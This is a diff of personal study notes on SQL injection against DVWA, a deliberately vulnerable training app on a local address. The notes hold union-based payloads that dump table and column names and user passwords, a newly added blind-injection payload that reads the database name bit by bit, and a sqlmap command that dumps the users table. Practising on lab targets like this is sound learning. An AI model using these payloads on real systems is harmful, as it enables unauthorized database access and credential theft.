@@ -164,10 +164,14 @@ Spli  --input parameter is char
 			id=1 union select column_name,2 from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#&Submit=Submit
 		# to get the content of a table
 			id=1 union select user,password from dvwa.users#&Submit=Submit
+sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer the select result to binary format of ASCII string, tell the bit 1 by 1
+	1' and substring(bin(ASCII(substring(database(),1,1))),1,1)>0#         #change the last second num to move the index of ASCII string/
 			
 			
 	sqlmap
 		sqlmap -u "http://192.168.0.104/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=sgefsbodcapjoirl8f3t731435" -p id -D dvwa -T users --dump
 			-p schema_name, -T table_name, --dump
 			--schames --tables --columns
+
+
 		
